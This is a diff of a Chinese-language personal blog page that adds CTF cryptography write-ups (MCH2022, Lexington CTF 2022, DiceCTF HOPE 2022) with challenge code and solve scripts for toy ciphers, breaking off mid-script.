@@ -185,6 +185,193 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/26/3kCTF-2021/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="MirRoR4s">
+      <meta itemprop="description" content="想成为c++专家 黑客 密码学爱好者">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="学习记录">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/07/26/3kCTF-2021/" class="post-title-link" itemprop="url">3kCTF-2021</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-07-26 08:46:02 / 修改时间：08:46:16" itemprop="dateCreated datePublished" datetime="2022-07-26T08:46:02+08:00">2022-07-26</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><a target="_blank" rel="noopener" href="https://b6a.black/posts/2021-05-22-3kctf/">https://b6a.black/posts/2021-05-22-3kctf/</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/24/MCH2022-CTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="MirRoR4s">
+      <meta itemprop="description" content="想成为c++专家 黑客 密码学爱好者">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="学习记录">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/07/24/MCH2022-CTF/" class="post-title-link" itemprop="url">MCH2022-CTF</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-07-24 09:43:14 / 修改时间：09:44:21" itemprop="dateCreated datePublished" datetime="2022-07-24T09:43:14+08:00">2022-07-24</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="MCH2022-CTF-Write-Up"><a href="#MCH2022-CTF-Write-Up" class="headerlink" title="MCH2022 CTF Write-Up"></a>MCH2022 CTF Write-Up</h1><h2 id="1-crypto-machine-1"><a href="#1-crypto-machine-1" class="headerlink" title="1. crypto machine 1"></a>1. crypto machine 1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">h</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">h_</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> binascii.unhexlify(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(m)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b_</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">m</span>):</span><br><span class="line">    t = string.maketrans(</span><br><span class="line">        <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> string.translate(m,t)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r_</span>(<span class="params">m</span>):</span><br><span class="line">    t = string.maketrans(</span><br><span class="line">        <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm&quot;</span></span><br><span class="line"></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> string.translate(m,t)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">x</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c)^<span class="number">0x42</span>) <span class="keyword">for</span> c <span class="keyword">in</span> m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="built_in">print</span>(b(x(h(r(s)))))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="built_in">print</span>(r_(h_(x(b_(s)))))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    decrypt(<span class="string">&#x27;diN1cHV7dXtwcnVzdHB0c3VwcCFwcnV0dHVwcnR0dXB1cHUjdHRwcnRwdHp0d3BydXB0c3VydHd0IXRxdHV1dHRwdHNwcnUjdCd1cnV3dXR0c3VwcHJ1c3RwdXB0dHRzcHV0dXBydCN0cHR3dXpwcnR1dXd0J3R1cHJ1dnRwdHB1c3AncHJ3dnR6dXB0dHR0cHJ0I3VwcHJ1d3QndHt1cHBydHV0cHBydXZ0cHBydCR0J3VydXpwcnR1dHBwcnR1dXd1cHBydXN0d3QndCN1dHRzdXZwcnR1dCd0JHV7dXBwJ3Byd3J0cHRzdXZ0d3QndHV0enV7dCd0dXV0dHB0c3R0cCFwcnQhdHB0enBydXN1cHR0dXB0d3R7dXBwcnQncHJ1cXV7dCd1dnEjcHJ1cXV7dCd1dnUgdXNxdnFzdXNxenVydXNxe3F6dXFxcnFydCRxcHFycXZ1cHF7cXpxcnFycXtxe3F6dXB1cnVxcXpxdnFwcXV1cHUm&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/23/Lexington-Informatics-Tournament-CTF-2022/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="MirRoR4s">
+      <meta itemprop="description" content="想成为c++专家 黑客 密码学爱好者">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="学习记录">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/07/23/Lexington-Informatics-Tournament-CTF-2022/" class="post-title-link" itemprop="url">Lexington_Informatics_Tournament_CTF-2022</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-23 12:57:41" itemprop="dateCreated datePublished" datetime="2022-07-23T12:57:41+08:00">2022-07-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-07-26 19:33:50" itemprop="dateModified" datetime="2022-07-26T19:33:50+08:00">2022-07-26</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>D</p>
+<h2 id="1-Running-up-That-Hill"><a href="#1-Running-up-That-Hill" class="headerlink" title="1. Running up That Hill"></a>1. Running up That Hill</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#123;&#125;</span><br><span class="line"></span><br><span class="line">5 19 27</span><br><span class="line">10 19 24</span><br><span class="line">11 6 16</span><br><span class="line"></span><br><span class="line">A8FC7A&#123;H7_ZODCEND_8F_CCQV_RTTVHD&#125;</span><br></pre></td></tr></table></figure>
+<p>看题目的名字猜测应该是希尔密码，然后题目还给出了一个3维方阵。直接去在线网站解密即可。</p>
+<p><a target="_blank" rel="noopener" href="https://www.dcode.fr/hill-cipher">https://www.dcode.fr/hill-cipher</a></p>
+<h2 id="2-A-ROCk"><a href="#2-A-ROCk" class="headerlink" title="2. A ROCk"></a>2. A ROCk</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n=8721839759350069167278335804233522732628197837843780295129915563071581371083672792796544014245271677069445637593635290140076123157617389715458979685368727</span><br><span class="line">e=65537</span><br><span class="line">ct=3831129304332239255280117442393824529915871197799278700713657686877437561020805823052809122048327006270135775002283258453774226602640149683603252934547033</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/23/DiceCTF-HOPE-2022/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -216,7 +403,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-26 19:12:04" itemprop="dateModified" datetime="2022-07-26T19:12:04+08:00">2022-07-26</time>
+                <time title="修改时间：2022-07-29 10:26:20" itemprop="dateModified" datetime="2022-07-29T10:26:20+08:00">2022-07-29</time>
               </span>
 
           
@@ -232,6 +419,8 @@
       
           <p>join the DiceCTF@hope in chinese time 2022/7/23</p>
 <p>官方wp：<a target="_blank" rel="noopener" href="https://github.com/dicegang/hope-2022-challenges">https://github.com/dicegang/hope-2022-challenges</a></p>
+<p>[TOC]</p>
+<h2 id="1-obp"><a href="#1-obp" class="headerlink" title="1.obp"></a>1.obp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    plaintext = f.read()</span><br><span class="line"></span><br><span class="line">key = random.randrange(<span class="number">256</span>)</span><br><span class="line">ciphertext = [key ^ byte <span class="keyword">for</span> byte <span class="keyword">in</span> plaintext]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>(ciphertext).<span class="built_in">hex</span>())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <h2 id="2-pem"><a href="#2-pem" class="headerlink" title="2.pem"></a>2.pem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;privatekey.pem&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.import_key(f.read())</span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&#x27;encrypted.bin&#x27;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">cipher_rsa =PKCS1_OAEP.new(key)</span><br><span class="line"><span class="built_in">print</span>(cipher_rsa.decrypt(f1))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <h2 id="3-kfb"><a href="#3-kfb" class="headerlink" title="3.kfb"></a>3.kfb</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python -u</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">from</span> more_itertools <span class="keyword">import</span> ichunked</span><br><span class="line"></span><br><span class="line">BLOCK = AES.block_size</span><br><span class="line">FLAG = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read().strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_block</span>(<span class="params">k, pt</span>):</span><br><span class="line">  cipher = AES.new(k, AES.MODE_ECB)</span><br><span class="line">  <span class="keyword">return</span> cipher.encrypt(pt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">k, pt</span>):</span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">len</span>(k) == BLOCK</span><br><span class="line">  pt = pad(pt, BLOCK)</span><br><span class="line">  ct = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">  <span class="keyword">for</span> bk <span class="keyword">in</span> ichunked(pt, BLOCK):</span><br><span class="line">    ct += strxor(encrypt_block(k, k), <span class="built_in">bytes</span>(bk))</span><br><span class="line">  <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">  k = get_random_bytes(BLOCK)</span><br><span class="line">  enc = encrypt(k, FLAG)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&#x27;&gt; <span class="subst">&#123;enc.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  pt = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&#x27;&lt; &#x27;</span>))[:BLOCK]</span><br><span class="line">  enc = encrypt(k, pt)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&#x27;&gt; <span class="subst">&#123;enc.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>可以进行选择明文攻击，给服务器发送空字节加密，然后可以得到<code>encrypt_block(k,k)</code>，根据这个就可以解密flag。但是尤其要注意的是发送的空字节会经过一个pad，所以实际上跟<code>encrypt_block(k,k)</code>异或的是填充后的空字节。</p>
@@ -243,12 +432,21 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">7146993245951509380139759140890681816862856635262037632915667109712467317954902955151177421740994622238561522690931235839733579166121631742096762557444153806131985279962646477997889661633938981817306610901055296705982494607773446985300816341071922739788638126631520234249358834592814880445497817389957300553660499631838091201561728727996660871094966330045071879490277901216751327226984526095495604592577841120425249633624459211547984305731778854596177467026282357094690700361174790351699376317810120824316300666128090632100150965101285647544696152528364989155735157261219949095760495520390692941417167332814540685297</span></span><br><span class="line">m = bytes_to_long(<span class="string">b&quot;hope&#123;a&#125;&quot;</span>[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        b = <span class="number">64</span></span><br><span class="line">        n = <span class="number">4</span></span><br><span class="line">        ps = [getPrime(b // n) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">        p = <span class="number">2</span> * product(ps) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = gen()</span><br><span class="line">        q = gen()</span><br><span class="line">        dp = GF(p)(m).log(c) </span><br><span class="line">        dq = GF(q)(m).log(c)</span><br><span class="line">        d = crt([ZZ(dp), ZZ(dq)], [p - <span class="number">1</span>, q - <span class="number">1</span>])</span><br><span class="line">        e = inverse_mod(d, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">        m = power_mod(c, d, p * q)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line">    <span class="built_in">print</span>(q)</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">int</span>.to_bytes(<span class="built_in">int</span>(m), <span class="number">256</span>, <span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">18237507977115134399</span></span><br><span class="line"><span class="string">13539415005905881139</span></span><br><span class="line"><span class="string">201049869065984997914383873658228289079</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># hope&#123;successful_decryption_doesnt_mean_correct_decryption_0363f29466b883edd763dc311716194d37dff5cd93cd4f1b4ac46152f4f9&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>​    </p>
 <h2 id="5-DESpicable-you"><a href="#5-DESpicable-you" class="headerlink" title="5.DESpicable you"></a>5.DESpicable you</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encipher</span>(<span class="params">a,b</span>):</span><br><span class="line">    c = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(a,b):</span><br><span class="line">        c+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rekey</span>(<span class="params">key</span>):</span><br><span class="line">    k = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i,c <span class="keyword">in</span> <span class="built_in">enumerate</span>(key):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="built_in">len</span>(key)-<span class="number">1</span>:</span><br><span class="line">            k += c</span><br><span class="line">            k += <span class="built_in">chr</span>(<span class="built_in">ord</span>(c)^<span class="built_in">ord</span>(key[<span class="number">0</span>]))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            k += c</span><br><span class="line">            k += <span class="built_in">chr</span>(<span class="built_in">ord</span>(c)^<span class="built_in">ord</span>(key[i+<span class="number">1</span>]))</span><br><span class="line">    key = k</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    key = urandom(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        plaintext = f.read()</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    ct = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(plaintext):</span><br><span class="line">        ct += encipher(plaintext[i:i+<span class="built_in">len</span>(key)],key)</span><br><span class="line">        i += <span class="built_in">len</span>(key)</span><br><span class="line">        rekey(key)</span><br><span class="line">    f2 = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f2.write(ct)</span><br><span class="line">    f2.close()</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>尝试的方法失败了，但是还是记录一下。</p>
+<p>尝试的方法失败了，但是还是记录一下。做题的时候主要python的版本，python3在读取密文的时候会报错。而且python3在输出一个bytes的时候会自动转为整数？</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">f1 = f[:<span class="number">5</span>]<span class="comment">#hope&#123;</span></span><br><span class="line"><span class="built_in">print</span>(f1)</span><br><span class="line">m=<span class="string">b&#x27;hope&#123;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encipher</span>(<span class="params">a,b</span>):</span><br><span class="line">    c = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(a,b):</span><br><span class="line">        c+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rekey</span>(<span class="params">key</span>):</span><br><span class="line">    k = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i,c <span class="keyword">in</span> <span class="built_in">enumerate</span>(key):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="built_in">len</span>(key)-<span class="number">1</span>:</span><br><span class="line">            k += c</span><br><span class="line">            k += <span class="built_in">chr</span>(<span class="built_in">ord</span>(c)^<span class="built_in">ord</span>(key[<span class="number">0</span>]))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            k += c</span><br><span class="line">            k += <span class="built_in">chr</span>(<span class="built_in">ord</span>(c)^<span class="built_in">ord</span>(key[i+<span class="number">1</span>]))</span><br><span class="line">    key = k</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = encipher(m,f1)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">&quot;flagggggggg.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">plaintext,key</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    ct = <span 